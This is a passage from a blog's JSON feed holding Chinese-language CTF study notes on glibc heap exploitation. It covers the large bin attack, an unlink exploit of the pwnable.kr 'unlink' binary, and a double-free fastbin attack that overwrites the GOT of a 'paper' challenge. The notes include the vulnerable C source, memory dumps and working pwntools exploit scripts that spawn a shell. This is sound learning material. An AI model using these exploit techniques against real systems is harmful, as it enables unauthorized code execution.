            "content_html": "<p>2.23 与2.30的分析,, 搭建源码,看源码,  做题</p>\n<p>分析漏洞伪造重点,步骤</p>\n<p>large bin 的攻击手法,根据libc的版本不同,随着libc版本的更新,加入了很多新的防御手法</p>\n<p><a href=\"https://blog.csdn.net/qq_41202237/article/details/112825556\">https://blog.csdn.net/qq_41202237/article/details/112825556</a></p>\n<p><a href=\"https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/large-bin-attack/\">https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/large-bin-attack/</a></p>\n<p><a href=\"https://github.com/shellphish/how2heap\">https://github.com/shellphish/how2heap</a></p>\n<p><a href=\"https://blog.csdn.net/A951860555/article/details/115477532\">https://blog.csdn.net/A951860555/article/details/115477532</a></p>\n<p><a href=\"https://lexsd6.github.io/2021/11/07/Largebin%20Attack%20for%20Glibc%202.31%20%E5%AD%A6%E4%B9%A0/\">https://lexsd6.github.io/2021/11/07/Largebin%20Attack%20for%20Glibc%202.31%20学习/</a></p>\n<img src=\"/pwn%E5%85%A5%E9%97%A8-19-%E5%A0%86%E5%85%A5%E9%97%A8%E4%B9%8BLarge-Bin-Attack/image-20230406085208132.png\" alt=\"image-20230406085208132\" style=\"zoom:25%;\">\n\n\n\n<p>gdb里查看源代码 list</p>\n<h1 id=\"2-23\"><a href=\"#2-23\" class=\"headerlink\" title=\"2.23\"></a>2.23</h1><p>可以实现任意地址写</p>\n<p>分析漏洞利用过程,  同时分析源码,   为什么会这样, 以及分析一下可以怎么样做到利用,然后找例题做一下</p>\n<p>下一下libc源码,分析分析 如何进行调试glibc</p>\n<p>为啥那个0x90的有四个值???</p>\n<p><img src=\"/pwn%E5%85%A5%E9%97%A8-19-%E5%A0%86%E5%85%A5%E9%97%A8%E4%B9%8BLarge-Bin-Attack/image-20230405220251607.png\" alt=\"image-20230405220251607\"></p>\n<p>1先放进large bin 2后放进去,然后再切歌1? fifo</p>\n<p>还是说2 1都放进largebin里,然后再切割? largebin是filo?</p>\n<p>总的来说,就是要伪造一个chunk,修改bk和bk_nextsize为想要修改的地址(还需要微调,bk的要-0x10,bk_nextsize要-0x20)</p>\n<h1 id=\"2-30后加入了新保护\"><a href=\"#2-30后加入了新保护\" class=\"headerlink\" title=\"2.30后加入了新保护\"></a>2.30后加入了新保护</h1>",
            "tags": [
                "PWN入门"
            ]
        },
        {
            "id": "https://tangzichengcc.github.io/pwn%E5%85%A5%E9%97%A8-18-%E5%A0%86%E5%85%A5%E9%97%A8%E4%B9%8Bunlink/",
            "url": "https://tangzichengcc.github.io/pwn%E5%85%A5%E9%97%A8-18-%E5%A0%86%E5%85%A5%E9%97%A8%E4%B9%8Bunlink/",
            "title": "pwn入门-18-堆入门之unlink",
            "date_published": "2023-03-07T08:52:20.000Z",
            "content_html": "<ul>\n<li>FD&#x3D;P-&gt;fd &#x3D; target addr -12</li>\n<li>BK&#x3D;P-&gt;bk &#x3D; expect value</li>\n<li>FD-&gt;bk &#x3D; BK，即 *(target addr-12+12)&#x3D;BK&#x3D;expect value</li>\n<li>BK-&gt;fd &#x3D; FD，即 *(expect value +8) &#x3D; FD &#x3D; target addr-12</li>\n</ul>\n<p>堆块的链接顺序是从大到小还是??</p>\n<p>Pwnable</p>\n<p>​\tgcc -Wl,-rpath&#x3D;&#x2F;home&#x2F;ubuntu&#x2F;glibc-all-in-one&#x2F;libs&#x2F;2.23-0ubuntu3_amd64&#x2F;&#x2F;,–dynamic-linker&#x3D;&#x2F;home&#x2F;ubuntu&#x2F;glibc-all-in-one&#x2F;libs&#x2F;2.23-0ubuntu3_amd64&#x2F;ld-linux-x86-64.so.2 1.c</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdlib.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;string.h&gt;</span></span></span><br><span class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">tagOBJ</span>&#123;</span></span><br><span class=\"line\">\t<span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">tagOBJ</span>* <span class=\"title\">fd</span>;</span></span><br><span class=\"line\">\t<span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">tagOBJ</span>* <span class=\"title\">bk</span>;</span></span><br><span class=\"line\">\t<span class=\"type\">char</span> buf[<span class=\"number\">8</span>];</span><br><span class=\"line\">&#125;OBJ;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">shell</span><span class=\"params\">()</span>&#123;</span><br><span class=\"line\">\tsystem(<span class=\"string\">&quot;/bin/sh&quot;</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">unlink</span><span class=\"params\">(OBJ* P)</span>&#123;</span><br><span class=\"line\">\tOBJ* BK;</span><br><span class=\"line\">\tOBJ* FD;</span><br><span class=\"line\">\tBK=P-&gt;bk;</span><br><span class=\"line\">\tFD=P-&gt;fd;</span><br><span class=\"line\">\tFD-&gt;bk=BK;</span><br><span class=\"line\">\tBK-&gt;fd=FD;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">main</span><span class=\"params\">(<span class=\"type\">int</span> argc, <span class=\"type\">char</span>* argv[])</span>&#123;</span><br><span class=\"line\">\t<span class=\"built_in\">malloc</span>(<span class=\"number\">1024</span>);</span><br><span class=\"line\">\tOBJ* A = (OBJ*)<span class=\"built_in\">malloc</span>(<span class=\"keyword\">sizeof</span>(OBJ));</span><br><span class=\"line\">\tOBJ* B = (OBJ*)<span class=\"built_in\">malloc</span>(<span class=\"keyword\">sizeof</span>(OBJ));</span><br><span class=\"line\">\tOBJ* C = (OBJ*)<span class=\"built_in\">malloc</span>(<span class=\"keyword\">sizeof</span>(OBJ));</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"comment\">// double linked list: A &lt;-&gt; B &lt;-&gt; C</span></span><br><span class=\"line\">\tA-&gt;fd = B;</span><br><span class=\"line\">\tB-&gt;bk = A;</span><br><span class=\"line\">\tB-&gt;fd = C;</span><br><span class=\"line\">\tC-&gt;bk = B;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;here is stack address leak: %p\\n&quot;</span>, &amp;A);</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;here is heap address leak: %p\\n&quot;</span>, A);</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;now that you have leaks, get shell!\\n&quot;</span>);</span><br><span class=\"line\">\t<span class=\"comment\">// heap overflow!</span></span><br><span class=\"line\">\tgets(A-&gt;buf);</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"comment\">// exploit this unlink!</span></span><br><span class=\"line\">\tunlink(B);</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n\n\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&quot;A&quot;*16 + (heap_addr+0x20+0x4) + (stack_addr+0x10) + (shell_addr)</span><br><span class=\"line\">&quot;A&quot;*16 +  (target addr -12)  + ( expect value:ebp -x04)    + (shell_addr)</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>​\t\t这个是要把堆中地址</p>\n<p>接收到stack地址,修改返回地址?</p>\n<h1 id=\"exp\"><a href=\"#exp\" class=\"headerlink\" title=\"exp\"></a>exp</h1><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\">sh = process(<span class=\"string\">&quot;./unlink&quot;</span>)</span><br><span class=\"line\">ELF=ELF(<span class=\"string\">&quot;./unlink&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">stack = sh.recvline().strip()</span><br><span class=\"line\">heap = sh.recvline().strip()</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">payload = p32(ELF.symbols[<span class=\"string\">&#x27;shell&#x27;</span>]) + <span class=\"string\">b&quot;a&quot;</span>*<span class=\"number\">12</span>\t + p32(heap+<span class=\"number\">0xc</span>) + p32(stack+<span class=\"number\">0x10</span>) </span><br><span class=\"line\">sh.send(payload)</span><br><span class=\"line\">sh.interactive()</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#pwn_ssh = ssh(host=&#x27;pwnable.kr&#x27;,user=&#x27;unlink&#x27;,password=&#x27;guest&#x27;,port=2222)</span></span><br><span class=\"line\">p = process(<span class=\"string\">&quot;/home/unlink/unlink&quot;</span>)</span><br><span class=\"line\">line1=p.readline().strip()</span><br><span class=\"line\">line2=p.readline().strip()</span><br><span class=\"line\">stack_addr = <span class=\"built_in\">int</span>(line1.split(<span class=\"string\">&#x27;: 0x&#x27;</span>)[<span class=\"number\">1</span>], <span class=\"number\">16</span>)</span><br><span class=\"line\">heap_addr = <span class=\"built_in\">int</span>(line2.split(<span class=\"string\">&#x27;: 0x&#x27;</span>)[<span class=\"number\">1</span>], <span class=\"number\">16</span>)</span><br><span class=\"line\">shell_addr = <span class=\"number\">0x080484eb</span></span><br><span class=\"line\"></span><br><span class=\"line\">p.sendline(<span class=\"string\">&#x27;A&#x27;</span>*<span class=\"number\">16</span> + p32(heap_addr+<span class=\"number\">0x24</span>) + p32(stack_addr+<span class=\"number\">0x10</span>) + p32(shell_addr))</span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n\n<p>pwnable怎么用exp呢?  写到&#x2F;tmp目录下</p>\n<p><a href=\"https://www.cnblogs.com/dlddw/p/13139172.html\">https://www.cnblogs.com/dlddw/p/13139172.html</a></p>\n<p><a href=\"https://etenal.me/archives/972#C30\">https://etenal.me/archives/972#C30</a></p>\n<p><a href=\"https://www.cnblogs.com/L0g4n-blog/p/13033301.html\">https://www.cnblogs.com/L0g4n-blog/p/13033301.html</a></p>\n<p>调试源代码1</p>\n<p><a href=\"https://www.blackhat.com/presentations/bh-europe-07/Sotirov/Presentation/bh-eu-07-sotirov-apr19.pdf\">https://www.blackhat.com/presentations/bh-europe-07/Sotirov/Presentation/bh-eu-07-sotirov-apr19.pdf</a></p>\n",
            "tags": [
                "PWN入门"
            ]
        },
        {
            "id": "https://tangzichengcc.github.io/pwn%E5%85%A5%E9%97%A8-17-%E5%A0%86%E5%85%A5%E9%97%A8%E4%B9%8Bfasbinattack/",
            "url": "https://tangzichengcc.github.io/pwn%E5%85%A5%E9%97%A8-17-%E5%A0%86%E5%85%A5%E9%97%A8%E4%B9%8Bfasbinattack/",
            "title": "pwn入门-17-堆入门之fasbinattack",
            "date_published": "2023-03-07T06:54:38.000Z",
            "content_html": "<p>xuanxuan : <a href=\"https://xuanxuanblingbling.github.io/ctf/pwn/2020/02/02/paper/\">https://xuanxuanblingbling.github.io/ctf/pwn/2020/02/02/paper/</a></p>\n<h1 id=\"Write-Some-Paper\"><a href=\"#Write-Some-Paper\" class=\"headerlink\" title=\"Write_Some_Paper\"></a>Write_Some_Paper</h1><p>申请不同的编号有影响吗????</p>\n<h2 id=\"怎么getshell呢\"><a href=\"#怎么getshell呢\" class=\"headerlink\" title=\"怎么getshell呢?\"></a>怎么getshell呢?</h2><p>​\t\t首先是获取任意或者受限制的地址读写的能力,然后修改关键函数等,比如修改got表,把函数地址替换成system或者后门函数地址,然后再执行的时候就getshell了</p>\n<h2 id=\"怎么实现地址写\"><a href=\"#怎么实现地址写\" class=\"headerlink\" title=\"怎么实现地址写?\"></a>怎么实现地址写?</h2><p>​\t\t利用double free,可以操控堆块的fd,从而实现把任意地址当作bin来进行申请空间,这样就获得了该地址的读写能力</p>\n<h2 id=\"double-free\"><a href=\"#double-free\" class=\"headerlink\" title=\"double free\"></a>double free</h2><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">add(<span class=\"number\">0</span>,<span class=\"number\">40</span>,<span class=\"string\">&quot;h&quot;</span>)</span><br><span class=\"line\">add(<span class=\"number\">1</span>,<span class=\"number\">40</span>,<span class=\"string\">&quot;h&quot;</span>) </span><br><span class=\"line\">delete(<span class=\"number\">0</span>)</span><br><span class=\"line\">delete(<span class=\"number\">1</span>)</span><br><span class=\"line\">delete(<span class=\"number\">0</span>)  <span class=\"comment\">//double free了</span></span><br><span class=\"line\">add(<span class=\"number\">2</span>,<span class=\"number\">40</span>,p64(<span class=\"number\">0x60203a</span>))<span class=\"comment\">//这个需要填入覆盖地址了</span></span><br><span class=\"line\">add(<span class=\"number\">3</span>,<span class=\"number\">40</span>,<span class=\"string\">&quot;bbb&quot;</span>)</span><br><span class=\"line\">add(<span class=\"number\">3</span>,<span class=\"number\">40</span>,<span class=\"string\">&quot;bbb&quot;</span>)  <span class=\"comment\">// 这一步后,会把fd(p64(0x60203a)) 放到fastbin的头部,下一次会申请到这里</span></span><br><span class=\"line\">add(<span class=\"number\">4</span>,<span class=\"number\">40</span>,<span class=\"string\">&quot;\\x40\\x00\\x00\\x00\\x00\\x00&quot;</span>+p64(ELF.symbols[<span class=\"string\">&#x27;gg&#x27;</span>])) <span class=\"comment\">//此时申请的就是第一次add时填入的fd地址\t\t</span></span><br></pre></td></tr></table></figure>\n\n<h2 id=\"申请堆块时的地址约束\"><a href=\"#申请堆块时的地址约束\" class=\"headerlink\" title=\"申请堆块时的地址约束\"></a>申请堆块时的地址约束</h2><p>​\t\t即size字段需要是fastbin这个链的大小，即目标地址的前8个字节需要满足，64位下这8个字节只要低4个字节满足就可以了。所以通过这种方式，我们可以控制的内存是需要满足一定约束的内存。也可以称这种满足要求的内存部分为伪堆块。获得这种内存有两种方式：</p>\n<ol>\n<li>寻找是否有天然满足伪堆块的约束的内存</li>\n<li>想办法构造伪堆块</li>\n</ol>\n<p>8字节prev_size 随意 , <font color=\"red\">8字节size(64位下前4字节满足大小,如0x40大小)</font>,要覆盖的fd(要修改的内存地址)</p>\n<p>要找到覆盖的函数,</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pwndbg&gt; x/<span class=\"number\">16</span>gx <span class=\"number\">0x602000</span></span><br><span class=\"line\"><span class=\"number\">0x602000</span>:\t<span class=\"number\">0x0000000000601e28</span>\t<span class=\"number\">0x00007ffff7ffe168</span></span><br><span class=\"line\"><span class=\"number\">0x602010</span>:\t<span class=\"number\">0x00007ffff7dee0b0</span>\t<span class=\"number\">0x00007ffff7a91a70</span></span><br><span class=\"line\"><span class=\"number\">0x602020</span>:\t<span class=\"number\">0x00007ffff7a7d5d0</span>\t<span class=\"number\">0x00007ffff7a7c0e0</span></span><br><span class=\"line\"><span class=\"number\">0x602030</span>:\t<span class=\"number\">0x0000000000400746</span>\t<span class=\"number\">0x0000000000400756</span></span><br><span class=\"line\"><span class=\"number\">0x602040</span>:\t<span class=\"number\">0x00007ffff7a637b0</span>\t<span class=\"number\">0x00007ffff7a2e740</span></span><br><span class=\"line\"><span class=\"number\">0x602050</span>:\t<span class=\"number\">0x0000000000400786</span>\t<span class=\"number\">0x00007ffff7a493b0</span></span><br><span class=\"line\"><span class=\"number\">0x602060</span>:\t<span class=\"number\">0x00007ffff7a91550</span>\t<span class=\"number\">0x00007ffff7a7ddb0</span></span><br><span class=\"line\"><span class=\"number\">0x602070</span>:\t<span class=\"number\">0x00007ffff7a79480</span>\t<span class=\"number\">0x00000000004007d6</span></span><br></pre></td></tr></table></figure>\n\n<p>这几个地方都可以作为size</p>\n<p><img src=\"/pwn%E5%85%A5%E9%97%A8-17-%E5%A0%86%E5%85%A5%E9%97%A8%E4%B9%8Bfasbinattack/image-20230307155602238.png\" alt=\"image-20230307155602238\"></p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">0x602000</span>:\t<span class=\"number\">0x28</span>\t<span class=\"number\">0x1e</span>\t<span class=\"number\">0x60</span>\t<span class=\"number\">0x00</span>\t<span class=\"number\">0x00</span>\t<span class=\"number\">0x00</span>\t<span class=\"number\">0x00</span>\t<span class=\"number\">0x00</span></span><br><span class=\"line\"><span class=\"number\">0x602008</span>:\t<span class=\"number\">0x68</span>\t<span class=\"number\">0xe1</span>\t<span class=\"number\">0xff</span>\t<span class=\"number\">0xf7</span>\t<span class=\"number\">0xff</span>\t<span class=\"number\">0x7f</span>\t<span class=\"number\">0x00</span>\t<span class=\"number\">0x00</span></span><br><span class=\"line\"><span class=\"number\">0x602010</span>:\t<span class=\"number\">0xb0</span>\t<span class=\"number\">0xe0</span>\t<span class=\"number\">0xde</span>\t<span class=\"number\">0xf7</span>\t<span class=\"number\">0xff</span>\t<span class=\"number\">0x7f</span>\t<span class=\"number\">0x00</span>\t<span class=\"number\">0x00</span></span><br><span class=\"line\"><span class=\"number\">0x602018</span> &lt;<span class=\"built_in\">free</span>@got.plt&gt;:\t<span class=\"number\">0x70</span>\t<span class=\"number\">0x1a</span>\t<span class=\"number\">0xa9</span>\t<span class=\"number\">0xf7</span>\t<span class=\"number\">0xff</span>\t<span class=\"number\">0x7f</span>\t<span class=\"number\">0x00</span>\t<span class=\"number\">0x00</span></span><br><span class=\"line\"><span class=\"number\">0x602020</span> &lt;<span class=\"built_in\">puts</span>@got.plt&gt;:\t<span class=\"number\">0xd0</span>\t<span class=\"number\">0xd5</span>\t<span class=\"number\">0xa7</span>\t<span class=\"number\">0xf7</span>\t<span class=\"number\">0xff</span>\t<span class=\"number\">0x7f</span>\t<span class=\"number\">0x00</span>\t<span class=\"number\">0x00</span></span><br><span class=\"line\"><span class=\"number\">0x602028</span> &lt;fread@got.plt&gt;:\t<span class=\"number\">0xe0</span>\t<span class=\"number\">0xc0</span>\t<span class=\"number\">0xa7</span>\t<span class=\"number\">0xf7</span>\t<span class=\"number\">0xff</span>\t<span class=\"number\">0x7f</span>\t<span class=\"number\">0x00</span>\t<span class=\"number\">0x00</span></span><br><span class=\"line\"><span class=\"number\">0x602030</span> &lt;__stack_chk_fail@got.plt&gt;:\t<span class=\"number\">0x46</span>\t<span class=\"number\">0x07</span>\t<span class=\"number\">0x40</span>\t<span class=\"number\">0x00</span>\t<span class=\"number\">0x00</span>\t<span class=\"number\">0x00</span>\t<span class=\"number\">0x00</span>\t<span class=\"number\">0x00</span></span><br><span class=\"line\"><span class=\"number\">0x602038</span> &lt;system@got.plt&gt;:\t<span class=\"number\">0x56</span>\t<span class=\"number\">0x07</span>\t<span class=\"number\">0x40</span>\t<span class=\"number\">0x00</span>\t<span class=\"number\">0x00</span>\t<span class=\"number\">0x00</span>\t<span class=\"number\">0x00</span>\t<span class=\"number\">0x00</span></span><br><span class=\"line\"><span class=\"number\">0x602040</span> &lt;<span class=\"built_in\">printf</span>@got.plt&gt;:\t<span class=\"number\">0xb0</span>\t<span class=\"number\">0x37</span>\t<span class=\"number\">0xa6</span>\t<span class=\"number\">0xf7</span>\t<span class=\"number\">0xff</span>\t<span class=\"number\">0x7f</span>\t<span class=\"number\">0x00</span>\t<span class=\"number\">0x00</span></span><br><span class=\"line\"><span class=\"number\">0x602048</span> &lt;__libc_start_main@got.plt&gt;:\t<span class=\"number\">0x40</span>\t<span class=\"number\">0xe7</span>\t<span class=\"number\">0xa2</span>\t<span class=\"number\">0xf7</span>\t<span class=\"number\">0xff</span>\t<span class=\"number\">0x7f</span>\t<span class=\"number\">0x00</span>\t<span class=\"number\">0x00</span></span><br><span class=\"line\"><span class=\"number\">0x602050</span> &lt;__gmon_start__@got.plt&gt;:\t<span class=\"number\">0x86</span>\t<span class=\"number\">0x07</span>\t<span class=\"number\">0x40</span>\t<span class=\"number\">0x00</span>\t<span class=\"number\">0x00</span>\t<span class=\"number\">0x00</span>\t<span class=\"number\">0x00</span>\t<span class=\"number\">0x00</span></span><br><span class=\"line\"><span class=\"number\">0x602058</span> &lt;strtol@got.plt&gt;:\t<span class=\"number\">0xb0</span>\t<span class=\"number\">0x93</span>\t<span class=\"number\">0xa4</span>\t<span class=\"number\">0xf7</span>\t<span class=\"number\">0xff</span>\t<span class=\"number\">0x7f</span>\t<span class=\"number\">0x00</span>\t<span class=\"number\">0x00</span></span><br><span class=\"line\"><span class=\"number\">0x602060</span> &lt;<span class=\"built_in\">malloc</span>@got.plt&gt;:\t<span class=\"number\">0x50</span>\t<span class=\"number\">0x15</span>\t<span class=\"number\">0xa9</span>\t<span class=\"number\">0xf7</span></span><br></pre></td></tr></table></figure>\n\n<p>​\t\t<font color=\"red\">根据这个来选择申请的堆块的大小</font></p>\n<p>​\t\t注意大小端的问题,这里选取这里作为伪造的chunk的size,然后后面是可控的数据,注意不要把system破坏了,然后把printf修改成后们地址即可</p>\n<p><img src=\"/pwn%E5%85%A5%E9%97%A8-17-%E5%A0%86%E5%85%A5%E9%97%A8%E4%B9%8Bfasbinattack/image-20230411214141077.png\" alt=\"image-20230411214141077\">\t</p>\n<h1 id=\"exp\"><a href=\"#exp\" class=\"headerlink\" title=\"exp\"></a>exp</h1><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\">context.log_level= <span class=\"string\">&quot;debug&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\">io = process(<span class=\"string\">&quot;./paper&quot;</span>)</span><br><span class=\"line\">elf = ELF(<span class=\"string\">&quot;./paper&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">add</span>(<span class=\"params\">num,length,context</span>):</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&quot;delete paper&quot;</span>,<span class=\"string\">&quot;1&quot;</span>)</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&quot;(0-9):&quot;</span>,<span class=\"built_in\">str</span>(num))</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&quot;enter&quot;</span>,<span class=\"built_in\">str</span>(length))</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&quot;content&quot;</span>,context)</span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">delete</span>(<span class=\"params\">index</span>):</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&quot;delete paper&quot;</span>,<span class=\"string\">&quot;2&quot;</span>)</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&quot;(0-9):&quot;</span>,<span class=\"built_in\">str</span>(index))</span><br><span class=\"line\">    </span><br><span class=\"line\">add(<span class=\"number\">0</span>,<span class=\"number\">40</span>,<span class=\"string\">&quot;h&quot;</span>)</span><br><span class=\"line\">add(<span class=\"number\">1</span>,<span class=\"number\">40</span>,<span class=\"string\">&quot;h&quot;</span>) </span><br><span class=\"line\">delete(<span class=\"number\">0</span>)</span><br><span class=\"line\">delete(<span class=\"number\">1</span>)</span><br><span class=\"line\">delete(<span class=\"number\">0</span>)</span><br><span class=\"line\">add(<span class=\"number\">2</span>,<span class=\"number\">40</span>,p64(<span class=\"number\">0x60203a</span>))//这个需要填入覆盖地址了</span><br><span class=\"line\">add(<span class=\"number\">3</span>,<span class=\"number\">40</span>,<span class=\"string\">&quot;bbb&quot;</span>)</span><br><span class=\"line\">add(<span class=\"number\">3</span>,<span class=\"number\">40</span>,<span class=\"string\">&quot;bbb&quot;</span>)</span><br><span class=\"line\">add(<span class=\"number\">4</span>,<span class=\"number\">40</span>,<span class=\"string\">&quot;\\x40\\x00\\x00\\x00\\x00\\x00&quot;</span>+p64(ELF.symbols[<span class=\"string\">&#x27;gg&#x27;</span>]))</span><br><span class=\"line\"></span><br><span class=\"line\">io.recv(<span class=\"number\">1024</span>)</span><br><span class=\"line\">io.sendline(<span class=\"string\">&quot;a&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">io.interactive()</span><br><span class=\"line\"><span class=\"comment\">#io.recv(1024)</span></span><br></pre></td></tr></table></figure>\n\n\n\n\n\n\n\n\n\n\n\n\n\n",
            "tags": [
                "PWN入门",
                "堆"
            ]
        },
        {
            "id": "https://tangzichengcc.github.io/%E9%80%86%E5%90%91%E5%85%A5%E9%97%A8-2-%E5%88%B7%E9%A2%98/",
            "url": "https://tangzichengcc.github.io/%E9%80%86%E5%90%91%E5%85%A5%E9%97%A8-2-%E5%88%B7%E9%A2%98/",
            "title": "逆向入门-2-刷题",
            "date_published": "2023-03-06T08:13:45.000Z",
